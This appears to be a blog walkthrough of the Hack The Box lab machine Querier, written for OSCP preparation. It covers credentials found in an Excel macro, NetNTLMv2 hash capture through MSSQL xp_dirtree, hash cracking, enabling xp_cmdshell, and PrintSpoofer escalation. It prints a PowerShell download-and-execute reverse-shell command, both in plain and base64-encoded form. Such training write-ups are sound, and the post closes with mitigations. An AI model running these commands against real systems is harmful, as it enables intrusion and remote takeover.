---
title: Querier
date: 2025-05-12
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Windows, xlsm-macros, VBA, mssql, mssql-service-hash, xp_cmdshell, PrintSpoofer ] 
image: querier.png
media_subpath: /assets/img/posts/2025-05-13-querierHTB/
---

## Introduction

In this walkthrough, I exploited **Querier**, a medium-difficulty Windows machine. Initial enumeration revealed a **world-readable SMB share** containing an **Excel spreadsheet with macros**. Upon analysis, I found that the macros attempted to authenticate to the local **MSSQL server**, I obtained credentials and logged in to SQL Server instance which allowed me to initiate a **UNC path request** and capture **NetNTLMv2 hashes**.

I cracked the captured hash offline to retrieve the user's plaintext credentials, then logged in SQL Server and executed a shell command using `xp_cmdshell`. For privilege escalation, I identified that **PrintSpoofer** could be used, which takes advantage of **SeImpersonatePrivilege** to escalate privileges to `NT AUTHORITY\SYSTEM`.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

![image.png](image%202.png)

## Services

### Port 139/445 (SMB,RPC)

- **smbclient**
    
    ![image.png](image%203.png)
    
    - Reports share
        
        I found just one file named: `Currency Volume Report.xlsm`.
        

I have found in that file the macros where it tries to connect to the MSSQL server to `volume` database and pull data from it to the sheet:

```vbnet
Rem Attribute VBA_ModuleType=VBADocumentModule
Option VBASupport 1

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub

```

### Port 1433 (MSSQL)

Version - Microsoft SQL Server 2017 14.00.1000

### Port 5985 (WinRM)

…

## Web

…


## Exploitation

```bash
mssqlclient.py -p 1433 reporting@$IP -windows-auth
```

![image.png](image%204.png)

We succeeded to connect to SQL Server with windows authentication.

I tried the credentials for connecting with evil-winrm too, but that didn’t work.

Listing databases:

```sql
SELECT * FROM master.dbo.sysdatabases
```

![image.png](image%205.png)

`master, msdb, model, resource, tempdb` are default SQL Server databases, the one non-default is `volume` database.

```sql
use volume;
SELECT table_name FROM volume.INFORMATION_SCHEMA.TABLES;
```

I don’t see any table in the database, maybe we should seek out another way of exploitation.

- **Command execution**
    
    I tried to execute commands but I don’t have permissions for that
    
    ```sql
    **EXECUTE xp_cmdshell 'whoami';
    EXECUTE sp_configure 'show advanced options', 1**
    ```
    
    **[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.**
    
- **Capturing service hash**
    
    ```bash
    sudo responder -I tun0
    ```
    
    ```sql
    EXEC master..xp_dirtree '\\10.10.14.27\share_name\'
    ```
    
    I was able to capture mssql-svc service hash
    
    ```sql
    mssql-svc::QUERIER:edca3e60b32937cf:8D36BA3D6D814491BFAA6D74A986676B:010100000000000080CEF5E868C3DB01485601697CCFE9FB000000000200080058004A003700480001001E00570049004E002D004300510053004100470042003000320047004300340004003400570049004E002D00430051005300410047004200300032004700430034002E0058004A00370048002E004C004F00430041004C000300140058004A00370048002E004C004F00430041004C000500140058004A00370048002E004C004F00430041004C000700080080CEF5E868C3DB010600040002000000080030003000000000000000000000000030000068D8C5BE7502B28C8FEC410C42707E041769F4D06AC689EEC8FA67AA99AF06A90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003700000000000000000000000000
    ```
    
    ![image.png](image%206.png)
    

Let’s try to crack that hash using hashcat mode 5600:

```bash
hashcat -m 5600 mssql-svc.hash /usr/share/wordlists/rockyou.txt
```

![image.png](image%207.png)

## Credentials

```bash
reporting : PcwTWTHRwryjc$c6
mssql-svc : corporate568
```

I tried logging in with evil-winrm but it didn’t work, that’s why I tried logging in to SQL server again.

```bash
mssqlclient.py -p 1433 mssql-svc@$IP -windows-auth
```

![image.png](image%208.png)

Let’s now try to execute commands:

```sql
EXECUTE xp_cmdshell 'whoami'
```

![image.png](image%209.png)

Now it doesn’t say that we don’t have permissions, it says that it is disabled for security reasons.

Let’s enable it:

```sql
**EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;**
```

Now we see we cane execute commands:

![image.png](image%2010.png)

Let’s try to get a shell as mssql-svc user.

I am gonna encode the following command into base64 with UTF-16LE:

```sql
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.27/powercat.ps1');powercat -c 10.10.14.27 -p 135 -e cmd"
```

and then execute with powershell `-enc` option:

```sql
EXECUTE xp_cmdshell 'powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIASQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA3AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQAwAC4AMQAwAC4AMQA0AC4AMgA3ACAALQBwACAAMQAzADUAIAAtAGUAIABjAG0AZAAiAA=='
```

Don’t forget to put `powercat.ps1` and share it with server.

Now we have a shell as `mssql-svc` service account:

![image.png](image%2011.png)

And we see that only users are `mssql-svc` and `Administrator` that means we don’t have to do lateral movement.

![image.png](image%2012.png)

## Privilege Escalation

We see that we have `SeImpersonatePrivilege`:

![image.png](image%2013.png)

That means we can perform Potato attacks, let’s first check the Windows version and build number to determine which one we are gonna use.

![image.png](image%2014.png)

>JuicyPotato doesn't work on Windows Server 2019 and Windows 10 **Build 17763** onwards. 
{: .prompt-info }

So I am gonna use PrintSpoofer attack:

```sql
./PrintSpoofer.exe -i -c cmd
```

![image.png](image%2015.png)

## Mitigation

- Restrict access to SMB shares; avoid **world-readable** permissions on sensitive files.
- Disable or secure **Office macros**, especially those that make outbound connections or authenticate to services.
- Patch or disable **SQL Server features** that allow loading remote files, especially `xp_dirtree`, `xp_fileexist`, etc.
- Prevent abuse of **NTLM authentication** by restricting outbound NTLM, and consider implementing **LDAP signing and channel binding**.
- Regularly update the system and mitigate known privilege escalation vulnerabilities like **PrintSpoofer** by applying vendor patches and enforcing least privilege.
